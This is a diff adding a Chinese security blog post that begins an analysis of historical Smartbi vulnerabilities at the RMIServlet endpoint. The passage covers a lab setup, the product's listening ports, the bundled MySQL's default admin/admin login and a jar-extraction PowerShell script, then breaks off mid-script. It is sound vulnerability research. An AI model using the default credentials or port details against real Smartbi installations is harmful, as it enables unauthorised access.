@@ -1,0 +1,1104 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Web, Security, Web安全, Java, Java安全">
+    <meta name="description" content="记录一下我的网安学习">
+    <meta name="author" content="1diot9">
+    
+    <title>
+        
+            Smartbi历史漏洞分析(一)————RMIServlet接口引发的惨案 |
+        
+        1diot9&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/baka.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#CCCCCC","title":"1diot9's Blog","author":"1diot9","avatar":"/images/baka.png","logo":"/images/baka.png","favicon":"/images/baka.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"登上山顶的人沉默不语，半途而废者诉说着旅途的艰辛","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://www.github.com/1diot9","weixin":"img | /images/weixin.jpg","qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2025,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/baka.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               1diot9&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        Smartbi历史漏洞分析(一)————RMIServlet接口引发的惨案
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/baka.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">1diot9</span>
+                                
+                                    <span class="author-badge">Lv5</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2026-03-30 23:25:56</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Wed Apr 08 2026 21:55:03 GMT+0800">2026-04-08 21:55:03</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>7.3k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>34 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <p>本文仅用于网络安全研究与技术交流目的，所涉及的技术、方法及示例仅限于在合法授权的环境下进行测试与学习。严禁将本文内容用于任何未授权的攻击行为或非法用途。因读者不当使用本文内容而造成的任何直接或间接后果，均由使用者自行承担，作者不承担任何责任。请在遵守相关法律法规及道德规范的前提下开展安全研究工作。</p>
+<p>本人水平有限，文章中难免出现谬误和不足，请各位师傅见谅，也欢迎各位进行指正，提出意见。</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>未特殊说明的，展示的代码截图默认为V11版本。</p>
+<p>Smartbi在&#x2F;smartbi&#x2F;vision&#x2F;RMIServlet处出过非常多的漏洞，故以此为切入点，深入分析一下Smartbi的历史漏洞。</p>
+<p>本文目标：</p>
+<p>1、环境搭建介绍</p>
+<p>2、路由分析</p>
+<p>3、补丁解密方法，补丁修复原理</p>
+<p>4、鉴权分析</p>
+<p>5、RMIServlet的职能</p>
+<p>6、RMIServlet之DB2命令执行漏洞绕过史</p>
+<p>7、RMIServlet之两个表达式执行漏洞</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774681432444-a6ce6523-7295-4998-983f-50c138528d47.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774681462435-7b4b146d-28f0-47bf-94e9-61c64b3fc862.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774681491405-c8ac1d90-a7f0-4a7b-a5ea-0a64f044e61c.png"  alt="img"></p>
+<p>V10最后一个版本在20230407发布，而V11在20230703最早发布。所以网上文章若是在2023年左右的，大概率是在分析V10版本的漏洞，这点需要知道，不然可能在复现时，发现自己的源码和网上文章里的对不上。补丁修复日期在2023年及之前的，基本也都是修复V10版本的漏洞，这些漏洞在V11基本都被在代码中修复了。</p>
+<p>文章中的部分资源：<a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/tree/main/CodeAudit/Smartbi" >https://github.com/1diot9/MyJavaSecStudy/tree/main/CodeAudit/Smartbi<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><a class="link"   target="_blank" rel="noopener" href="https://www.smartbi.com.cn/download" >https://www.smartbi.com.cn/download<i class="fas fa-external-link-alt"></i></a></p>
+<p>进入官方网站，点击右上角申请试用ABI，注册账户后，选择个人版进行下载即可，新下载的V11版本自带一个月激活，后续激活也可以自行到官网申请证书。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774834427879-01037ad4-1bec-45c2-93e5-18ac13a318a6.png"  alt="img"></p>
+<p>下载exe后，跟进指示步骤进行安装即可。</p>
+<p>安装好后的项目结构如图：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774833890386-7891af39-8f7b-4d03-86dd-03281100fea3.png"  alt="img"></p>
+<p>自带的jdk是8u202版本，mysql版本为5.7.39</p>
+<p>Smartbi开头的文件夹smartbi的其他服务，不是这里关注的重点。</p>
+<p>Tomcat目录下，就是经典servlet项目的结构了。</p>
+<p>bin&#x2F;startup.cmd是windows下的启动脚本，所以远程调试参数要在这个文件里加，而不是一般的catalina.bat：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774834218515-35f1cbc6-3d66-4abe-a7ca-912816bdc9aa.png"  alt="img"></p>
+<p>bin&#x2F;exts-smartbi是smartbi的插件目录。</p>
+<p>在启动前后，分别执行以下的命令：</p>
+<p>netstat -ano | findstr ‘[::]’ | findstr LISTENING</p>
+<p>对比开放的端口，找出新开放的端口：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TCP    <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">18080</span>          <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">0</span>              LISTENING       <span class="number">1216</span>			smartbi web服务</span><br><span class="line">TCP    <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">18005</span>        <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">0</span>              LISTENING       <span class="number">1216</span>			tomcat关闭端口</span><br><span class="line">TCP    [::]:<span class="number">18080</span>             [::]:<span class="number">0</span>                 LISTENING       <span class="number">1216</span>			smartbi web服务</span><br><span class="line">TCP    [::]:<span class="number">6688</span>              [::]:<span class="number">0</span>                 LISTENING       <span class="number">32960</span>		MYSQL  </span><br><span class="line">TCP    [::]:<span class="number">9001</span>              [::]:<span class="number">0</span>                 LISTENING       <span class="number">14948</span>		HSQL</span><br><span class="line">           :<span class="number">5005</span>																															JVM远程调试</span><br></pre></td></tr></table></figure>
+
+<p>注意，这里的6688端口，在smartbi安装好后，就以服务的形式常驻在系统中了，所以这不是我前后对比找到的，而是另外自己加入的，因为安装时有对6688端口进行检测。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774834846416-d7543c99-3617-49dc-b6a2-575d877a2a1b.png"  alt="img"></p>
+<p>mysql的用户名和密码默认为admin&#x2F;admin，尝试登录：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774834951523-9a796631-61e6-41a6-b0e7-fc90c316c7dd.png"  alt="img"></p>
+<p>最后把WEB-INF&#x2F;lib和tomcat的lib全部添加到idea库，然后就可以开始远程调试了。</p>
+<p>补充一下，其实还要把Tomcat&#x2F;bin&#x2F;exts-smartbi里出现的jar也添加进去，这里面是smartbi自带的扩展。</p>
+<p>可以通过下面的交互式ps1脚本去提取jar文件：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1774849351162-e9966014-8d50-4a52-a1dd-ec1f0111ad3f.png"  alt="img"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">param</span>(</span><br><span class="line">    [<span class="type">Alias</span>(<span class="string">&quot;s&quot;</span>)]</span><br><span class="line">    [<span class="built_in">string</span>]<span class="variable">$Source</span> = <span class="string">&quot;.&quot;</span>,</span><br><span class="line"></span><br><span class="line">    [<span class="type">Alias</span>(<span class="string">&quot;o&quot;</span>)]</span><br><span class="line">    [<span class="built_in">string</span>]<span class="variable">$Output</span> = <span class="string">&quot;&quot;</span>,</span><br><span class="line"></span><br><span class="line">    [<span class="type">Alias</span>(<span class="string">&quot;e&quot;</span>)]</span><br><span class="line">    [<span class="built_in">string</span>]<span class="variable">$Ext</span> = <span class="string">&quot;&quot;</span>,</span><br><span class="line"></span><br><span class="line">    [<span class="type">Alias</span>(<span class="string">&quot;k&quot;</span>)]</span><br><span class="line">    [<span class="built_in">string</span>]<span class="variable">$KeepStructure</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="variable">$ErrorActionPreference</span> = <span class="string">&quot;Stop&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ([<span class="built_in">string</span>]::IsNullOrWhiteSpace(<span class="variable">$Ext</span>)) &#123;</span><br><span class="line">    <span class="variable">$Ext</span> = <span class="built_in">Read-Host</span> <span class="string">&quot;Extensions (default: jsp, supports comma or space)&quot;</span></span><br><span class="line">    <span class="keyword">if</span> ([<span class="built_in">string</span>]::IsNullOrWhiteSpace(<span class="variable">$Ext</span>)) &#123;</span><br><span class="line">        <span class="variable">$Ext</span> = <span class="string">&quot;jsp&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ([<span class="built_in">string</span>]::IsNullOrWhiteSpace(<span class="variable">$Output</span>)) &#123;</span><br><span class="line">    <span class="variable">$Output</span> = <span class="built_in">Read-Host</span> <span class="string">&quot;Output directory (default: output)&quot;</span></span><br><span class="line">    <span class="keyword">if</span> ([<span class="built_in">string</span>]::IsNullOrWhiteSpace(<span class="variable">$Output</span>)) &#123;</span><br><span class="line">        <span class="variable">$Output</span> = <span class="string">&quot;output&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ([<span class="built_in">string</span>]::IsNullOrWhiteSpace(<span class="variable">$KeepStructure</span>)) &#123;</span><br><span class="line">    <span class="variable">$keepStructureInput</span> = <span class="built_in">Read-Host</span> <span class="string">&quot;Keep original directory structure? (Y/n, default: Y)&quot;</span></span><br><span class="line">    <span class="keyword">if</span> ([<span class="built_in">string</span>]::IsNullOrWhiteSpace(<span class="variable">$keepStructureInput</span>)) &#123;</span><br><span class="line">        <span class="variable">$KeepStructure</span> = <span class="string">&quot;true&quot;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$KeepStructure</span> = <span class="variable">$keepStructureInput</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$keepStructureEnabled</span> = <span class="variable">$false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$KeepStructure</span>.Trim().ToLowerInvariant()) &#123;</span><br><span class="line">    <span class="string">&quot;y&quot;</span> &#123; <span class="variable">$keepStructureEnabled</span> = <span class="variable">$true</span> &#125;</span><br><span class="line">    <span class="string">&quot;yes&quot;</span> &#123; <span class="variable">$keepStructureEnabled</span> = <span class="variable">$true</span> &#125;</span><br><span class="line">    <span class="string">&quot;true&quot;</span> &#123; <span class="variable">$keepStructureEnabled</span> = <span class="variable">$true</span> &#125;</span><br><span class="line">    <span class="string">&quot;1&quot;</span> &#123; <span class="variable">$keepStructureEnabled</span> = <span class="variable">$true</span> &#125;</span><br><span class="line">    <span class="string">&quot;n&quot;</span> &#123; <span class="variable">$keepStructureEnabled</span> = <span class="variable">$false</span> &#125;</span><br><span class="line">    <span class="string">&quot;no&quot;</span> &#123; <span class="variable">$keepStructureEnabled</span> = <span class="variable">$false</span> &#125;</span><br><span class="line">    <span class="string">&quot;false&quot;</span> &#123; <span class="variable">$keepStructureEnabled</span> = <span class="variable">$false</span> &#125;</span><br><span class="line">    <span class="string">&quot;0&quot;</span> &#123; <span class="variable">$keepStructureEnabled</span> = <span class="variable">$false</span> &#125;</span><br><span class="line">    default &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">&quot;KeepStructure must be one of: Y, Yes, N, No, True, False, 1, 0.&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sourcePath</span> = (<span class="built_in">Resolve-Path</span> <span class="literal">-LiteralPath</span> <span class="variable">$Source</span>).Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ([<span class="type">System.IO.Path</span>]::IsPathRooted(<span class="variable">$Output</span>)) &#123;</span><br><span class="line">    <span class="variable">$outputPath</span> = <span class="variable">$Output</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$outputPath</span> = <span class="built_in">Join-Path</span> <span class="literal">-Path</span> <span class="variable">$sourcePath</span> <span class="literal">-ChildPath</span> <span class="variable">$Output</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$normalizedSourcePath</span> = [<span class="type">System.IO.Path</span>]::GetFullPath(<span class="variable">$sourcePath</span>)</span><br><span class="line"><span class="variable">$normalizedOutputPath</span> = [<span class="type">System.IO.Path</span>]::GetFullPath(<span class="variable">$outputPath</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$normalizedExtensions</span> = <span class="variable">$Ext</span> <span class="operator">-split</span> <span class="string">&quot;[;,\s]+&quot;</span> |</span><br><span class="line">    <span class="built_in">Where-Object</span> &#123; <span class="operator">-not</span> [<span class="built_in">string</span>]::IsNullOrWhiteSpace(<span class="variable">$_</span>) &#125; |</span><br><span class="line">    <span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">        <span class="variable">$item</span> = <span class="variable">$_</span>.Trim().ToLowerInvariant()</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$item</span>.StartsWith(<span class="string">&quot;.&quot;</span>)) &#123;</span><br><span class="line">            <span class="variable">$item</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="string">&quot;.&#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="variable">$item</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; |</span><br><span class="line">    <span class="built_in">Select-Object</span> <span class="literal">-Unique</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$normalizedExtensions</span>.Count <span class="operator">-eq</span> <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">&quot;At least one file extension must be provided.&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$invalidFileNameCharsPattern</span> = <span class="string">&quot;[&#123;0&#125;]&quot;</span> <span class="operator">-f</span> [<span class="type">Regex</span>]::Escape(([<span class="built_in">string</span>][<span class="type">System.IO.Path</span>]::GetInvalidFileNameChars()))</span><br><span class="line"></span><br><span class="line"><span class="variable">$matchedFiles</span> = <span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> <span class="variable">$normalizedSourcePath</span> <span class="literal">-Recurse</span> <span class="operator">-File</span> |</span><br><span class="line">    <span class="built_in">Where-Object</span> &#123;</span><br><span class="line">        <span class="variable">$fullName</span> = [<span class="type">System.IO.Path</span>]::GetFullPath(<span class="variable">$_</span>.FullName)</span><br><span class="line">        (<span class="operator">-not</span> <span class="variable">$fullName</span>.StartsWith(<span class="variable">$normalizedOutputPath</span>, [<span class="type">System.StringComparison</span>]::OrdinalIgnoreCase)) <span class="operator">-and</span></span><br><span class="line">        (<span class="variable">$normalizedExtensions</span> <span class="operator">-contains</span> <span class="variable">$_</span>.Extension.ToLowerInvariant())</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$duplicateNameMap</span> = <span class="selector-tag">@</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="operator">-not</span> <span class="variable">$keepStructureEnabled</span>) &#123;</span><br><span class="line">    <span class="variable">$matchedFiles</span> |</span><br><span class="line">        <span class="built_in">Group-Object</span> <span class="literal">-Property</span> Name |</span><br><span class="line">        <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.Count <span class="operator">-gt</span> <span class="number">1</span> &#125; |</span><br><span class="line">        <span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">            <span class="variable">$duplicateNameMap</span>[<span class="variable">$_</span><span class="type">.Name</span>] = <span class="variable">$true</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="operator">-not</span> (<span class="built_in">Test-Path</span> <span class="literal">-LiteralPath</span> <span class="variable">$normalizedOutputPath</span>)) &#123;</span><br><span class="line">    <span class="built_in">New-Item</span> <span class="literal">-ItemType</span> Directory <span class="literal">-Path</span> <span class="variable">$normalizedOutputPath</span> | <span class="built_in">Out-Null</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$item</span> <span class="keyword">in</span> <span class="variable">$matchedFiles</span>) &#123;</span><br><span class="line">    <span class="variable">$relativePath</span> = <span class="variable">$item</span>.FullName.Substring(<span class="variable">$normalizedSourcePath</span>.Length).TrimStart(<span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$keepStructureEnabled</span>) &#123;</span><br><span class="line">        <span class="variable">$targetPath</span> = <span class="built_in">Join-Path</span> <span class="literal">-Path</span> <span class="variable">$normalizedOutputPath</span> <span class="literal">-ChildPath</span> <span class="variable">$relativePath</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$duplicateNameMap</span>.ContainsKey(<span class="variable">$item</span>.Name)) &#123;</span><br><span class="line">            <span class="variable">$flattenedName</span> = <span class="variable">$relativePath</span> <span class="operator">-replace</span> <span class="string">&quot;[\\/]+&quot;</span>, <span class="string">&quot;.&quot;</span></span><br><span class="line">            <span class="variable">$flattenedName</span> = <span class="variable">$flattenedName</span> <span class="operator">-replace</span> <span class="variable">$invalidFileNameCharsPattern</span>, <span class="string">&quot;_&quot;</span></span><br><span class="line">            <span class="variable">$targetFileName</span> = <span class="variable">$flattenedName</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$targetFileName</span> = <span 